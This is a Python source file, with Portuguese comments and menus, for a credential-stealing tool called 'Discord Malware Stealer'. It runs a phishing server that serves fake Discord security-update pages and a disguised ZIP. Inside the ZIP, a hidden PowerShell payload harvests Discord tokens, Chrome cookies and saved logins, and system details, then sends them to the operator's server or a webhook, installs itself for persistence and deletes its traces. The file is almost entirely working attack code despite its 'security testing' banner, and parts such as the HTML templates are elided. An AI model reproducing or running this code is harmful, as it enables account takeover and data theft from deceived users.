#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import base64
import json
import sqlite3
import hashlib
import threading
import socket
import zipfile
import io
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import requests

# Interface colorida no terminal
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.text import Text
from rich.syntax import Syntax

console = Console()

class DiscordMalwareStealer:
    def __init__(self):
        self.web_server = None
        self.server_port = 8080
        self.webhook_url = ""
        self.redirect_url = "https://discord.com"
        self.server_ip = self.get_local_ip()
        self.encryption_key = get_random_bytes(32)
        self.html_templates = self._load_html_templates()
        self.current_template = "discord_update"
        self.is_running = False
        
    def get_local_ip(self):
        """Obtém o IP local da máquina"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def _load_html_templates(self):
        """Carrega todos os templates HTML disponíveis"""
        return {
            "discord_update": self._create_discord_update_template(),
            "security_update": self._create_security_update_template(),
            "voice_fix": self._create_voice_fix_template(),
            "theme_installer": self._create_theme_installer_template()
        }
    
    def _create_discord_update_template(self):
        """Template de atualização do Discord"""
        # (O template HTML permanece o mesmo da versão anterior)
        return """...template HTML completo...""" % self.redirect_url

    def _generate_malicious_executable(self):
        """Gera um executável malicioso real"""
        # Código PowerShell que será executado no sistema da vítima
        powershell_code = f'''# Discord Security Update Script
# Auto-generated update utility

$webhookURL = "{self.webhook_url}"
$serverURL = "http://{self.server_ip}:{self.server_port}"

function Collect-SystemInfo {{
    $systemInfo = @{{
        username = $env:USERNAME
        computername = $env:COMPUTERNAME
        os = (Get-WmiObject -Class Win32_OperatingSystem).Caption
        architecture = $env:PROCESSOR_ARCHITECTURE
        cpu = (Get-WmiObject -Class Win32_Processor).Name
        ram = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
        gpu = (Get-WmiObject -Class Win32_VideoController).Name
        ip = (Test-Connection -ComputerName (hostname) -Count 1).IPV4Address.IPAddressToString
        timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    }}
    return $systemInfo
}}

function Extract-DiscordTokens {{
    $tokens = @()
    $discordPaths = @(
        "$env:APPDATA\\Discord",
        "$env:LOCALAPPDATA\\Discord",
        "$env:APPDATA\\discordcanary",
        "$env:APPDATA\\discordptb"
    )
    
    foreach ($path in $discordPaths) {{
        if (Test-Path $path) {{
            $localStoragePath = "$path\\Local Storage\\leveldb"
            if (Test-Path $localStoragePath) {{
                Get-ChildItem $localStoragePath -Filter *.ldb | ForEach-Object {{
                    $content = Get-Content $_.FullName -Raw -Encoding UTF8
                    if ($content -match "[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}") {{
                        $matches[0] | ForEach-Object {{
                            $tokens += @{{
                                token = $_
                                source = $_.Name
                                type = "Discord"
                            }}
                        }}
                    }}
                }}
            }}
        }}
    }}
    return $tokens
}}

function Extract-BrowserData {{
    $browserData = @()
    
    # Chrome cookies and passwords
    $chromePaths = @(
        "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies",
        "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"
    )
    
    foreach ($path in $chromePaths) {{
        if (Test-Path $path) {{
            try {{
                Copy-Item $path "$env:TEMP\\chrome_temp" -Force
                $browserData += @{{
                    type = "ChromeData"
                    path = $path
                    content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path))
                }}
            }} catch {{}}
        }}
    }}
    
    return $browserData
}}

function Send-DataToServer {{
    param($data)
    
    try {{
        $jsonData = $data | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri "$serverURL/capture" -Method Post -Body $jsonData -ContentType "application/json"
    }} catch {{
        # Fallback to webhook if server is down
        if ($webhookURL) {{
            $discordData = @{{
                content = "New victim data collected"
                embeds = @(@{{
                    title = "System Information"
                    fields = @(
                        @{{name = "Username"; value = $data.systemInfo.username; inline = $true}},
                        @{{name = "Computer"; value = $data.systemInfo.computername; inline = $true}},
                        @{{name = "OS"; value = $data.systemInfo.os; inline = $true}},
                        @{{name = "IP"; value = $data.systemInfo.ip; inline = $true}},
                        @{{name = "Tokens Found"; value = $data.tokens.Count; inline = $true}}
                    )
                    timestamp = $data.systemInfo.timestamp
                }})
            }}
            Invoke-RestMethod -Uri $webhookURL -Method Post -Body ($discordData | ConvertTo-Json) -ContentType "application/json"
        }}
    }}
}}

# Main execution
Write-Host "Discord Security Update - Installing..." -ForegroundColor Green

$collectedData = @{{
    systemInfo = Collect-SystemInfo
    tokens = Extract-DiscordTokens
    browserData = Extract-BrowserData
    malwareVersion = "2.1.7"
}}

Send-DataToServer $collectedData

# Persistence mechanism
$persistencePath = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\DiscordUpdate.exe"
if (!(Test-Path $persistencePath)) {{
    Copy-Item $MyInvocation.MyCommand.Path $persistencePath
}}

Write-Host "Update completed successfully!" -ForegroundColor Green
Start-Sleep 2

# Cleanup
Remove-Item $MyInvocation.MyCommand.Path -Force
'''

        # Criar um arquivo batch que executa o PowerShell
        batch_content = f'''@echo off
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "{powershell_code.replace('"', '`"')}"
echo Discord Update completed successfully!
pause
'''

        return batch_content.encode('utf-8')

    def _generate_malicious_zip(self):
        """Gera um arquivo ZIP malicioso com múltiplas camadas"""
        zip_buffer = io.BytesIO()
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            # Arquivo principal (executável)
            zip_file.writestr('DiscordUpdate_2.1.7.exe', self._generate_malicious_executable())
            
            # Arquivos de apoio para parecer legítimo
            zip_file.writestr('README.txt', '''Discord Critical Security Update
Version: 2.1.7
Release Date: ''' + datetime.now().strftime('%Y-%m-%d') + '''

This update addresses critical security vulnerabilities in Discord's:
- Voice communication protocol
- Message encryption
- User authentication system

INSTALLATION:
1. Extract all files
2. Run DiscordUpdate_2.1.7.exe
3. Follow on-screen instructions

Note: Your Discord client will restart automatically after update.

© 2024 Discord Inc. All rights reserved.
''')
            
            zip_file.writestr('EULA.txt', '''END USER LICENSE AGREEMENT

By installing this update, you agree to:
- Automatic security patches
- Improved performance monitoring
- Enhanced privacy protections
''')
            
            # Adicionar ícone e metadata
            zip_file.writestr('setup.ini', '''[Setup]
AppName=Discord Security Update
AppVersion=2.1.7
AppPublisher=Discord Inc.
''')

        return zip_buffer.getvalue()

    def encrypt_data(self, data):
        """Criptografa dados sensíveis"""
        try:
            if isinstance(data, dict):
                data = json.dumps(data)
            elif not isinstance(data, str):
                data = str(data)
                
            cipher = AES.new(self.encryption_key, AES.MODE_CBC)
            ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
            return base64.b64encode(cipher.iv + ct_bytes).decode('utf-8')
        except Exception as e:
            console.print(f"[red]Erro na criptografia: {e}[/red]")
            return data

    def decrypt_data(self, encrypted_data):
        """Descriptografa dados"""
        try:
            data = base64.b64decode(encrypted_data)
            iv, ct = data[:16], data[16:]
            cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
            decrypted = unpad(cipher.decrypt(ct), AES.block_size).decode('utf-8')
            
            try:
                return json.loads(decrypted)
            except:
                return decrypted
                
        except Exception as e:
            console.print(f"[red]Erro na descriptografia: {e}[/red]")
            return encrypted_data

    def configurar_servidor(self):
        """Configura as opções do servidor"""
        console.clear()
        console.print(Panel.fit(
            "[bold]Configuração do Servidor[/bold]",
            border_style="blue"
        ))
        
        self.server_port = IntPrompt.ask(
            "[yellow]?[/yellow] Porta do servidor",
            default=self.server_port
        )
        
        self.redirect_url = Prompt.ask(
            "[yellow]?[/yellow] URL de redirecionamento",
            default=self.redirect_url
        )
        
        console.print(f"[green]✓ Servidor configurado na porta {self.server_port}[/green]")
        time.sleep(1)

    def configurar_webhook(self):
        """Configura webhook do Discord (OPCIONAL)"""
        console.clear()
        console.print(Panel.fit(
            "[bold]Configuração de Webhook (OPCIONAL)[/bold]",
            border_style="blue"
        ))
        
        console.print("[yellow]⚠ O webhook é opcional. Pressione Enter para pular.[/yellow]")
        
        webhook = Prompt.ask(
            "[yellow]?[/yellow] URL do Webhook Discord",
            default=self.webhook_url
        )
        
        if webhook:
            self.webhook_url = webhook
            console.print("[green]✓ Webhook configurado com sucesso![/green]")
        else:
            self.webhook_url = ""
            console.print("[yellow]⚠ Webhook não configurado[/yellow]")
        
        time.sleep(1)

    def selecionar_template(self):
        """Seleciona o template HTML a ser usado"""
        console.clear()
        console.print(Panel.fit(
            "[bold]Selecionar Template[/bold]",
            border_style="blue"
        ))
        
        templates = list(self.html_templates.keys())
        tabela = Table(show_header=True, header_style="bold green")
        tabela.add_column("ID", style="cyan")
        tabela.add_column("Template", style="green")
        tabela.add_column("Descrição", style="yellow")
        
        descricoes = {
            "discord_update": "Atualização Crítica do Discord",
            "security_update": "Patch de Segurança",
            "voice_fix": "Correção de Voz",
            "theme_installer": "Instalador de Temas"
        }
        
        for i, template in enumerate(templates, 1):
            tabela.add_row(str(i), template, descricoes.get(template, "Sem descrição"))
        
        console.print(tabela)
        
        escolha = Prompt.ask(
            "[blink yellow]➤[/blink yellow] Selecione o template",
            choices=[str(i) for i in range(1, len(templates) + 1)],
            show_choices=False
        )
        
        self.current_template = templates[int(escolha) - 1]
        console.print(f"[green]✓ Template selecionado: {self.current_template}[/green]")
        time.sleep(1)

    def iniciar_servidor_web(self):
        """Inicia o servidor web para captura de tokens"""
        if self.is_running:
            console.print("[yellow]⚠ Servidor já está em execução[/yellow]")
            time.sleep(1)
            return
        
        console.clear()
        console.print(Panel.fit(
            "[bold]Iniciando Servidor Web[/bold]",
            border_style="blue"
        ))
        
        class DiscordMalwareHandler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                """Silencia logs padrão"""
                return
            
            def do_GET(self):
                """Manipula requisições GET"""
                try:
                    if self.path == '/':
                        self.send_response(200)
                        self.send_header('Content-type', 'text/html; charset=utf-8')
                        self.end_headers()
                        
                        html_content = self.server.stealer.html_templates[
                            self.server.stealer.current_template
                        ]
                        
                        self.wfile.write(html_content.encode('utf-8'))
                        
                    elif self.path == '/download_update':
                        # Servir o arquivo ZIP malicioso
                        malicious_zip = self.server.stealer._generate_malicious_zip()
                        self.send_response(200)
                        self.send_header('Content-Type', 'application/zip')
                        self.send_header('Content-Disposition', 'attachment; filename="Discord_Security_Update_2.1.7.zip"')
                        self.send_header('Content-Length', str(len(malicious_zip)))
                        self.end_headers()
                        self.wfile.write(malicious_zip)
                        
                    elif self.path == '/favicon.ico':
                        self.send_response(204)
                        self.end_headers()
                        
                    else:
                        self.send_response(302)
                        self.send_header('Location', self.server.stealer.redirect_url)
                        self.end_headers()
                        
                except Exception as e:
                    self.send_response(500)
                    self.end_headers()
            
            def do_POST(self):
                """Manipula requisições POST de captura"""
                try:
                    if self.path == '/capture':
                        content_length = int(self.headers.get('Content-Length', 0))
                        if content_length > 0:
                            post_data = self.rfile.read(content_length)
                            data = json.loads(post_data.decode('utf-8'))
                            
                            # Processa e salva os dados
                            self.server.stealer.processar_dados_capturados(data)
                            
                            self.send_response(200)
                            self.send_header('Content-type', 'text/plain')
                            self.end_headers()
                            self.wfile.write(b'OK')
                        else:
                            self.send_response(400)
                            self.end_headers()
                    else:
                        self.send_response(404)
                        self.end_headers()
                        
                except Exception as e:
                    console.print(f"[red]Erro no POST: {e}[/red]")
                    self.send_response(500)
                    self.end_headers()
        
        try:
            server = HTTPServer(('', self.server_port), DiscordMalwareHandler)
            server.stealer = self
            
            # Inicia o servidor em thread separada
            server_thread = threading.Thread(target=server.serve_forever)
            server_thread.daemon = True
            server_thread.start()
            
            self.web_server = server
            self.is_running = True
            
            console.print(Panel.fit(
                f"[green]✓ Servidor iniciado com sucesso![/green]\n\n"
                f"[cyan]URL:[/cyan] http://{self.server_ip}:{self.server_port}\n"
                f"[cyan]Template:[/cyan] {self.current_template}\n"
                f"[cyan]Arquivo Malicioso:[/cyan] /download_update\n"
                f"[cyan]Webhook:[/cyan] {'Configurado' if self.webhook_url else 'Não configurado (OPCIONAL)'}",
                title="[bold green]SERVIDOR ATIVO[/bold green]",
                border_style="green"
            ))
            
            console.print(Panel.fit(
                "[yellow]⚠ Pressione Enter para parar o servidor[/yellow]",
                border_style="yellow"
            ))
            
            # Aguarda entrada do usuário para parar
            input()
            console.print("\n[red]✗ Servidor parado[/red]")
            self.is_running = False
            server.shutdown()
            server.server_close()
                
        except Exception as e:
            console.print(Panel.fit(
                f"[red]✗ Erro ao iniciar servidor: {str(e)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
            self.is_running = False
            time.sleep(2)

    def processar_dados_capturados(self, data):
        """Processa os dados capturados"""
        try:
            # Cria diretório de dados se não existir
            if not os.path.exists('data'):
                os.makedirs('data')
            
            # Conecta ao banco de dados
            conn = sqlite3.connect('data/discord_malware.db')
            c = conn.cursor()
            
            # Cria tabelas se não existirem
            c.execute('''CREATE TABLE IF NOT EXISTS captures
                         (id INTEGER PRIMARY KEY AUTOINCREMENT,
                          timestamp TEXT,
                          tokens TEXT,
                          system_info TEXT,
                          network_info TEXT,
                          template_used TEXT,
                          action_type TEXT,
                          encrypted INTEGER DEFAULT 1)''')
            
            # Prepara dados para inserção
            timestamp = datetime.now().isoformat()
            tokens_encrypted = self.encrypt_data(data.get('tokens', []))
            system_info_encrypted = self.encrypt_data(data.get('systemInfo', {}))
            network_info_encrypted = self.encrypt_data(data.get('networkInfo', {}))
            
            # Insere dados
            c.execute('''INSERT INTO captures 
                         (timestamp, tokens, system_info, network_info, template_used, action_type, encrypted)
                         VALUES (?, ?, ?, ?, ?, ?, 1)''',
                     (timestamp, tokens_encrypted, system_info_encrypted, 
                      network_info_encrypted, self.current_template, data.get('action', 'unknown')))
            
            conn.commit()
            conn.close()
            
            # Envia webhook se configurado (OPCIONAL)
            if self.webhook_url:
                self.enviar_webhook_discord(data)
            
            console.print(f"[green]✓ Dados capturados em {timestamp}[/green]")
            
        except Exception as e:
            console.print(f"[red]✗ Erro ao processar dados: {str(e)}[/red]")

    def enviar_webhook_discord(self, data):
        """Envia dados para webhook do Discord (OPCIONAL)"""
        try:
            embed = {
                "title": "🎯 Nova Captura de Dados do Discord",
                "color": 0x5865f2,
                "fields": [
                    {
                        "name": "📅 Timestamp",
                        "value": data.get('systemInfo', {}).get('timestamp', 'N/A'),
                        "inline": True
                    },
                    {
                        "name": "👤 Usuário",
                        "value": data.get('systemInfo', {}).get('username', 'N/A'),
                        "inline": True
                    },
                    {
                        "name": "💻 Computador",
                        "value": data.get('systemInfo', {}).get('computername', 'N/A'),
                        "inline": True
                    },
                    {
                        "name": "🖥️ Sistema",
                        "value": data.get('systemInfo', {}).get('os', 'N/A'),
                        "inline": True
                    },
                    {
                        "name": "🌍 IP",
                        "value": data.get('systemInfo', {}).get('ip', 'N/A'),
                        "inline": True
                    }
                ],
                "footer": {
                    "text": f"Template: {self.current_template} | Discord Malware Stealer"
                }
            }
            
            # Adicionar informações de tokens
            tokens = data.get('tokens', [])
            if tokens:
                token_count = len(tokens)
                token_preview = "\n".join(
                    f"`{t.get('source', 'unknown')}: {t.get('token', 'unknown')[:15]}...`"
                    for t in tokens[:3]
                )
                
                if token_count > 3:
                    token_preview += f"\n... e mais {token_count - 3} tokens"
                
                embed["fields"].append({
                    "name": f"🔑 Tokens Encontrados ({token_count})",
                    "value": token_preview,
                    "inline": False
                })
            
            payload = {
                "embeds": [embed],
                "username": "Discord Security Bot",
                "avatar_url": "https://discord.com/assets/192cb9459cee8e3c2c0d31a8387c0b5d.svg"
            }
            
            response = requests.post(self.webhook_url, json=payload, timeout=10)
            
            if response.status_code in [200, 204]:
                console.print("[green]✓ Webhook enviado com sucesso![/green]")
            else:
                console.print(f"[red]✗ Erro no webhook: {response.status_code}[/red]")
                
        except Exception as e:
            console.print(f"[red]✗ Erro ao enviar webhook: {str(e)}[/red]")

    # ... (outros métodos permanecem iguais: ver_dados_capturados, mostrar_detalhes_captura, exportar_dados, mostrar_estatisticas)

    def mostrar_menu_principal(self):
        """Menu principal do sistema"""
        while True:
            console.clear()
            self.mostrar_banner()
            
            tabela = Table(
                title="[bold cyan]🔧 DISCORD MALWARE STEALER AVANÇADO[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            tabela.add_column("Opção", style="cyan", width=10)
            tabela.add_column("Ação", style="green")
            tabela.add_column("Status", style="yellow")
            
            status_server = "[red]OFF[/red]" if not self.is_running else "[green]ON[/green]"
            status_webhook = "[red]OFF[/red]" if not self.webhook_url else "[green]ON[/green]"
            
            tabela.add_row("1", "Configurar Servidor", "")
            tabela.add_row("2", "Selecionar Template", f"[blue]{self.current_template}[/blue]")
            tabela.add_row("3", "Iniciar Servidor Web", status_server)
            tabela.add_row("4", "Ver Dados Capturados", "")
            tabela.add_row("5", "Configurar Webhook", status_webhook)
            tabela.add_row("6", "Exportar Dados", "")
            tabela.add_row("7", "Estatísticas", "")
            tabela.add_row("0", "Sair", "")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione uma opção",
                choices=["0", "1", "2", "3", "4", "5", "6", "7"],
                show_choices=False
            )
            
            opcoes = {
                "1": self.configurar_servidor,
                "2": self.selecionar_template,
                "3": self.iniciar_servidor_web,
                "4": self.ver_dados_capturados,
                "5": self.configurar_webhook,
                "6": self.exportar_dados,
                "7": self.mostrar_estatisticas,
                "0": lambda: sys.exit(0)
            }
            
            if escolha in opcoes:
                opcoes[escolha]()

    def mostrar_banner(self):
        """Exibe banner personalizado"""
        banner = """
[bold blue]
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗      ║
║    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗     ║
║    ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║     ║
║    ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║     ║
║    ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝     ║
║    ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝      ║
║                                                              ║
║                 DISCORD MALWARE STEALER v4.0                 ║
║                 [red]WITH REAL MALWARE[/red]                 ║
╚══════════════════════════════════════════════════════════════╝[/bold blue]
"""
        console.print(banner)
        console.print(Panel.fit(
            "[blink bold red]⚠️ FERRAMENTA DE TESTE DE SEGURANÇA - USE COM EXTREMA CAUTELA! ⚠️[/blink bold red]",
            style="red on black"
        ))

def main():
    """Função principal"""
    try:
        stealer = DiscordMalwareStealer()
        stealer.mostrar_menu_principal()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Programa encerrado[/red]")
    except Exception as e:
        console.print(f"\n[red]✗ Erro crítico: {str(e)}[/red]")

if __name__ == '__main__':
    main()
